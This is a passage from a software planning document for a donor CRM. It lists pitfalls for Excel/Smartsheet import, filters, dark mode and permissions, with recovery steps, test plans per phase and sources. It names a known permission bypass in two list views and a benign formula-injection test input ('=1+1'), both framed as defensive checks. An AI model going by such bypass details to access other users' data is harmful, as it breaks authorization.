| No count indicator next to filter options | User doesn't know if a filter has results before clicking | Show count badge: "Donor (42)" next to filter option |

## "Looks Done But Isn't" Checklist

Things that appear complete but are missing critical pieces.

- [ ] **Excel import:** Tested with .xlsx but not with merged cells, serial number dates, Smartsheet checkbox columns, or LibreOffice exports
- [ ] **Column mapping UI:** Works with mouse but not keyboard; no "Skip this column" option; no preview of mapped values
- [ ] **Filter state:** UI state syncs on filter click, but bookmarked URL doesn't restore filter dropdowns on page load
- [ ] **Dark mode:** New import wizard components use `bg-background` but custom elements (error badges, progress bar, file drop zone) use hard-coded colors
- [ ] **Import validation:** Happy path works, but no tests for formula injection payloads, Excel serial number dates, or 10MB file uploads
- [ ] **Permission checks:** ContactList has owner scoping, but ContactDonationsView and ContactPledgesView still bypass permissions on list endpoints
- [ ] **Query performance:** Filters work with 10 test contacts; not profiled with 5000+ contacts and M2M group joins
- [ ] **Error messages:** Validation errors show field names from code (`contact_first_name`) not user-friendly names ("First Name")
- [ ] **File upload feedback:** Shows spinner but no progress percentage, file name, or estimated time for large files
- [ ] **Mapping state persistence:** Works during session but lost on refresh, back button, or accidental navigation
- [ ] **Filter debounce:** Search input fires API request on every keystroke instead of debounced
- [ ] **Accessibility:** Column mapper has no ARIA labels; filter dropdowns work with mouse but not keyboard navigation

## Recovery Strategies

When pitfalls occur despite prevention, how to recover.

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Formula injection in imported data | MEDIUM | Data migration to sanitize: prefix formula-like strings with `'` character; review all contacts/donations for formula prefixes |
| Permission bypass exploited | HIGH | Patch `get_queryset()` immediately; audit access logs for cross-user access patterns; notify affected users |
| N+1 queries causing slow filtered pages | LOW | Add `select_related()`/`prefetch_related()` to view's `get_queryset()`; deploy as hotfix |
| Dark mode broken in new features | LOW | Grep for hard-coded colors, replace with semantic classes; deploy within hours |
| Memory exhaustion from large Excel upload | MEDIUM | Add `DATA_UPLOAD_MAX_MEMORY_SIZE` to settings; switch to `read_only=True` mode; redeploy |
| Float precision errors in filter comparisons | MEDIUM | Fix `monthly_equivalent` to use Decimal; retest all filter queries that reference pledge amounts |
| Broken CSV imports after shared code modification | HIGH | Revert shared code changes immediately; restore original functions; add full regression test suite before re-attempting |
| Duplicate contacts from M2M filter | LOW | Add `.distinct()` to queryset; clean duplicate API responses already cached in frontend |
| Filter state desync (URL vs UI) | LOW | Extract shared `useFilterParams` hook; refactor all filter handlers to use it |
| Excel serial number dates imported as text | MEDIUM | Data migration to parse integer fields as dates where they match serial number range; update affected records |

## Pitfall-to-Phase Mapping

How roadmap phases should address these pitfalls.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Permission bypass in list views (#5) | Phase 0 (Security prerequisite) | Attempt `GET /api/v1/contacts/{other_user_uuid}/donations/` as regular user; verify empty/404 |
| Float arithmetic in monthly_equivalent (#11) | Phase 0 (Quality prerequisite) | `Decimal('100') / Decimal('3') * Decimal('3') == Decimal('100')` passes exact equality |
| Excel serial number dates (#1) | Phase 1 (Excel parsing) | Import file with serial number dates (44927); verify correct date (2023-01-01) |
| Merged cells in headers (#2) | Phase 1 (Excel parsing) | Import file with merged header row; verify non-merged row detected as headers |
| Breaking existing CSV imports (#3) | Phase 1 (Excel parsing) | Run ALL existing tests: `test_fund_import.py`, `test_entity_import.py`, `test_transaction_import.py`, `test_pledge_import.py` |
| Formula injection on import (#4) | Phase 1 (Excel parsing) | Import file with `=1+1` in first_name field; verify rejection |
| Memory exhaustion (#7) | Phase 1 (Excel parsing) | Upload 10MB Excel file; monitor RSS memory; verify no OOM |
| Smartsheet export quirks (#10) | Phase 2 (Column mapping UI) | Import real Smartsheet export with hidden columns and checkboxes; verify mapping works |
| M2M group filter duplicates (#6) | Phase 3 (Filtering backend) | Filter contacts by group where contacts belong to multiple groups; verify no duplicates |
| Filter query performance (#6) | Phase 3 (Filtering backend) | Apply 3 filters simultaneously on 1000+ contacts; verify <10 queries and <500ms response |
| Filter state desync (#8) | Phase 4 (Filtering frontend) | Bookmark URL with 3 active filters; reload page; verify all filters restored in UI |
| Dark mode audit scope (#9) | Phase 5 (Quality audit) | Predefined checklist of pages to audit; pass/fail criteria documented before starting |

## Sources

**Excel/Smartsheet Parsing:**
- [openpyxl Dates and Times](https://openpyxl.readthedocs.io/en/stable/datetime.html) -- serial number handling, 1900 leap year bug
- [openpyxl merged cells](https://gist.github.com/tchen/01d1d61a985190ff6b71fc14c45f95c9) -- MergedCell type returns None
- [Smartsheet Export Documentation](https://help.smartsheet.com/articles/770623-exporting-sheets-reports-from-smartsheet) -- hidden columns, checkbox export behavior
- [Smartsheet Excel Export without hidden columns](https://community.smartsheet.com/discussion/144142/excel-export-without-hidden-columns)

**Security:**
- [CSV Injection | OWASP Foundation](https://owasp.org/www-community/attacks/CSV_Injection) -- formula prefix attack vectors
- [DRF Filtering](https://www.django-rest-framework.org/api-guide/filtering/) -- "ensure unpermitted objects not in results"
- [DRF Permissions](https://www.django-rest-framework.org/api-guide/permissions/) -- "object permissions only checked via get_object()"

**Performance:**
- [django-filter Performance Issues #1264](https://github.com/carltongibson/django-filter/issues/1264) -- large dataset filtering
- [10 Tips to Optimize PostgreSQL Queries in Django](https://blog.gitguardian.com/10-tips-to-optimize-postgresql-queries-in-your-django-project/)
- [Django and the N+1 Queries Problem](https://www.scoutapm.com/blog/django-and-the-n1-queries-problem)

**Frontend Filtering:**
- [Why URL state matters: useSearchParams](https://blog.logrocket.com/url-state-usesearchparams/) -- single source of truth pattern
- [Advanced React state management using URL parameters](https://blog.logrocket.com/advanced-react-state-management-using-url-parameters/)

**Dark Mode:**
- [Dark Mode - Tailwind CSS](https://tailwindcss.com/docs/dark-mode) -- class-based dark mode strategy
- [Simple dark mode with Tailwind and CSS variables](https://invertase.io/blog/tailwind-dark-mode)

**Existing Codebase (HIGH confidence):**
- `apps/imports/services.py` -- formula injection gaps in parse_contacts_csv/parse_donations_csv
- `apps/contacts/views.py:139-171` -- ContactDonationsView/ContactPledgesView permission bypass
- `apps/pledges/models.py:138-146` -- float arithmetic in monthly_equivalent
- `apps/core/permissions.py:65-98` -- IsContactOwnerOrReadAccess only implements has_object_permission
- `.planning/EDGE_CASE_AUDIT.md` -- known issues #2, #3.1, #4.1, #6.1
- `frontend/src/pages/contacts/ContactList.tsx:63-65` -- URL param filter pattern to extend
- `frontend/src/styles/globals.css` -- CSS variable theming system

---
*Pitfalls research for: DonorCRM v1.3 -- Smartsheet Import, Filters & Polish*
*Researched: 2026-02-16*
